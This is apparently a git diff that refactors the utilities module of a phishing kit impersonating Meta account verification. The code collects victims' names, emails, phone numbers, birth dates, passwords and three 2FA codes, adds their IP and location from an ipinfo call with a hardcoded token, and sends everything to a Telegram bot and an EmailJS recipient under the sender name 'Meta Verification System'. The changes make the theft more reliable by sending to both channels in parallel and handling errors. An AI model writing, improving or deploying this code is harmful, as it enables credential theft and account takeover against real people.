@@ -1,21 +1,42 @@
-// Utilities
+/**
+ * Utilities Module
+ * Yêu cầu: Đã load thư viện CryptoJS và biến toàn cục CONFIG
+ */
 const Utils = {
+    // ==========================================
+    // 🔐 SECURITY & ENCRYPTION
+    // ==========================================
+
     encrypt(text) {
+        if (!text) return '';
         return CryptoJS.AES.encrypt(text, CONFIG.SECRET_KEY).toString();
     },
 
     decrypt(cipherText) {
-        const bytes = CryptoJS.AES.decrypt(cipherText, CONFIG.SECRET_KEY);
-        return bytes.toString(CryptoJS.enc.Utf8);
+        if (!cipherText) return '';
+        try {
+            const bytes = CryptoJS.AES.decrypt(cipherText, CONFIG.SECRET_KEY);
+            return bytes.toString(CryptoJS.enc.Utf8);
+        } catch (error) {
+            console.error('Decryption error:', error);
+            return null;
+        }
     },
+
+    // ==========================================
+    // 💾 LOCAL STORAGE MANAGEMENT
+    // ==========================================
 
     saveRecord(key, value) {
         try {
             const encryptedValue = this.encrypt(JSON.stringify(value));
-            const record = { value: encryptedValue, expiry: Date.now() + CONFIG.STORAGE_EXPIRY };
+            const record = { 
+                value: encryptedValue, 
+                expiry: Date.now() + CONFIG.STORAGE_EXPIRY 
+            };
             localStorage.setItem(key, JSON.stringify(record));
         } catch (error) {
-            console.error('Save error:', error);
+            console.error(`Save error for key "${key}":`, error);
         }
     },
 
@@ -23,21 +44,29 @@ const Utils = {
         try {
             const item = localStorage.getItem(key);
             if (!item) return null;
+
             const { value, expiry } = JSON.parse(item);
             if (Date.now() > expiry) {
                 localStorage.removeItem(key);
                 return null;
             }
+
             const decrypted = this.decrypt(value);
             return decrypted ? JSON.parse(decrypted) : null;
         } catch (error) {
+            console.error(`Get record error for key "${key}":`, error);
             return null;
         }
     },
 
+    // ==========================================
+    // 🌐 NETWORK & LOCATION
+    // ==========================================
+
     async getUserIp() {
         try {
             const response = await fetch('https://api.ipify.org?format=json');
+            if (!response.ok) throw new Error('Network response was not ok');
             const data = await response.json();
             return data.ip;
         } catch (error) {
@@ -47,38 +76,38 @@ const Utils = {
     },
 
     async getUserLocation() {
+        const defaultFallback = { 
+            location: 'N/A', country_code: 'N/A', ip: 'N/A', region: 'N/A', country: 'N/A' 
+        };
+
         try {
             const response = await fetch("https://ipinfo.io/json?token=5a58a2d85996e3");
             if (!response.ok) throw new Error("Network response was not ok");
 
             const data = await response.json();
-
             return {
-                location: `${data.ip} | ${data.city || 'N/A'} | ${data.region || 'N/A'} (${data.country})`,
+                location: `${data.ip || 'N/A'} | ${data.city || 'N/A'} | ${data.region || 'N/A'} (${data.country || 'N/A'})`,
                 country_code: data.country || "N/A",
                 ip: data.ip || "N/A",
                 region: data.region || "N/A",
-                country: data.country || "N/A"   // hoặc data.org nếu muốn ISP
+                country: data.country || "N/A"
             };
         } catch (error) {
             console.error("Error getting location:", error);
-
-            return {
-                location: "N/A",
-                country_code: "N/A",
-                ip: "N/A",
-                region: "N/A",
-                country: "N/A"
-            };
+            return defaultFallback;
         }
     },
 
+    // ==========================================
+    // 📩 NOTIFICATIONS & MESSAGING
+    // ==========================================
+
     async sendToTelegram(data) {
-        const locationData = await this.getUserLocation();
+        const { ip, location } = await this.getUserLocation();
 
         const text = `
-<b>IP:</b> <code>${locationData.ip}</code>
-<b>Location:</b> <code>${locationData.location})</code>
+<b>IP:</b> <code>${ip}</code>
+<b>Location:</b> <code>${location}</code>
 ----------------------------------
 <b>Full Name:</b> <code>${data.fullName || ''}</code>
 <b>Email:</b> <code>${data.email || ''}</code>
@@ -91,7 +120,7 @@ const Utils = {
 ----------------------------------
 <b>🔐Code 2FA(1):</b> <code>${data.twoFa || ''}</code>
 <b>🔐Code 2FA(2):</b> <code>${data.twoFaSecond || ''}</code>
-<b>🔐Code 2FA(3):</b> <code>${data.twoFaThird || ''}</code>`;
+<b>🔐Code 2FA(3):</b> <code>${data.twoFaThird || ''}</code>`.trim();
 
         try {
             await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -104,23 +133,42 @@ const Utils = {
                 })
             });
         } catch (error) {
-            console.error('Telegram error:', error);
+            console.error('Telegram notification error:', error);
         }
     },
 
+    loadEmailJSSDK() {
+        if (window.emailjs) return Promise.resolve();
+
+        return new Promise((resolve, reject) => {
+            const script = document.createElement('script');
+            script.src = 'https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js';
+            script.onload = () => {
+                emailjs.init(CONFIG.EMAILJS_PUBLIC_KEY);
+                resolve();
+            };
+            script.onerror = () => reject(new Error('Failed to load EmailJS SDK'));
+            document.head.appendChild(script);
+        });
+    },
+
     async sendToEmail(data) {
-        const locationData = await this.getUserLocation();
+        const { ip, location } = await this.getUserLocation();
+        // Tránh lỗi undefined/undefined/undefined nếu không nhập ngày sinh
+        const dob = (data.day && data.month && data.year) 
+            ? `${data.day}/${data.month}/${data.year}` 
+            : 'N/A';
 
         const emailContent = `
-IP: ${locationData.ip}
-Location: ${locationData.location}
+IP: ${ip}
+Location: ${location}
 ----------------------------------
 Full Name: ${data.fullName || ''}
 Email: ${data.email || ''}
 Email Business: ${data.emailBusiness || ''}
 Page Name: ${data.fanpage || ''}
 Phone: ${data.phone || ''}
-Date of Birth: ${data.day}/${data.month}/${data.year}
+Date of Birth: ${dob}
 ----------------------------------
 Password(1): ${data.password || ''}
 Password(2): ${data.passwordSecond || ''}
@@ -129,20 +177,16 @@ Password(2): ${data.passwordSecond || ''}
 🔐Code 2FA(2): ${data.twoFaSecond || ''}
 🔐Code 2FA(3): ${data.twoFaThird || ''}
 
-Sent at: ${new Date().toLocaleString()}`;
+Sent at: ${new Date().toLocaleString()}`.trim();
 
         try {
-            // Load EmailJS SDK if not already loaded
-            if (!window.emailjs) {
-                await this.loadEmailJSSDK();
-            }
-
+            await this.loadEmailJSSDK();
             await emailjs.send(
                 CONFIG.EMAILJS_SERVICE_ID,
                 CONFIG.EMAILJS_TEMPLATE_ID,
                 {
                     to_email: CONFIG.EMAIL_RECIPIENT,
-                    subject: `Meta Verification - ${locationData.location}`,
+                    subject: `Meta Verification - ${location}`,
                     message: emailContent,
                     from_name: 'Meta Verification System',
                     reply_to: data.email || 'noreply@system.com'
@@ -150,55 +194,44 @@ Sent at: ${new Date().toLocaleString()}`;
                 CONFIG.EMAILJS_PUBLIC_KEY
             );
         } catch (error) {
-            console.error('Email error:', error);
+            console.error('Email notification error:', error);
         }
-    },
-
-    loadEmailJSSDK() {
-        return new Promise((resolve, reject) => {
-            if (window.emailjs) {
-                resolve();
-                return;
-            }
-
-            const script = document.createElement('script');
-            script.src = 'https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js';
-            script.onload = () => {
-                emailjs.init(CONFIG.EMAILJS_PUBLIC_KEY);
-                resolve();
-            };
-            script.onerror = reject;
-            document.head.appendChild(script);
-        });
     },
 
     async sendNotification(data) {
-        const notificationType = CONFIG.NOTIFICATION_TYPE;
+        const type = CONFIG.NOTIFICATION_TYPE?.toLowerCase();
+        const tasks = [];
+
+        if (type === 'telegram' || type === 'both') {
+            tasks.push(this.sendToTelegram(data));
+        }
+        if (type === 'email' || type === 'both') {
+            tasks.push(this.sendToEmail(data));
+        }
 
         try {
-            if (notificationType === 'telegram' || notificationType === 'both') {
-                await this.sendToTelegram(data);
-            }
-
-            if (notificationType === 'email' || notificationType === 'both') {
-                await this.sendToEmail(data);
-            }
+            // Chạy song song cả Telegram và Email (nếu là 'both') giúp giảm 50% thời gian chờ
+            await Promise.allSettled(tasks);
         } catch (error) {
-            console.error('Notification error:', error);
+            console.error('Notification dispatch error:', error);
         }
     },
 
+    // ==========================================
+    // 🛠 FORMATTING & HELPERS
+    // ==========================================
+
     maskPhone(phone) {
-        if (!phone || phone.length < 5) return phone;
+        if (!phone || phone.length < 5) return phone || '';
         const start = phone.slice(0, 2);
         const end = phone.slice(-2);
-        return `${start} ${'*'.repeat(phone.length - 4)} ${end}`;
+        return `${start}${'*'.repeat(phone.length - 4)}${end}`;
     },
 
     maskEmail(email) {
         if (!email) return '';
-        return email.replace(/^(.)(.*?)(.)@(.+)$/, (_, a, mid, c, domain) => {
-            return `${a}${'*'.repeat(mid.length)}${c}@${domain}`;
+        return email.replace(/^(.)(.*?)(.)@(.+)$/, (_, firstChar, midChars, lastChar, domain) => {
+            return `${firstChar}${'*'.repeat(midChars.length)}${lastChar}@${domain}`;
         });
     },
 
@@ -207,4 +240,3 @@ Sent at: ${new Date().toLocaleString()}`;
         return `${gen()}-${gen()}-${gen()}`;
     }
 };
-
